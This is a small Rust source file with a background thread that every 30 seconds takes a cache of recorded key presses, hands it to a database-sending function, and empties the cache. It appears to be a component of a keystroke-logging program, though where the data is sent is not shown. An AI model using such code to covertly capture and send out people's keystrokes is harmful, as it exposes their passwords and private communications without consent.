use std::{thread, time};

use crate::ram::PubInfo;

pub fn clear_ram_thread() {
    loop {
        thread::sleep(time::Duration::from_secs(30));
        let mut data = PubInfo::get();
        if !data.key_pressed_cache.is_empty()
        {
            crate::db::send_db(&data.key_pressed_cache);
            data.key_pressed_cache = vec![];
        }
    }
}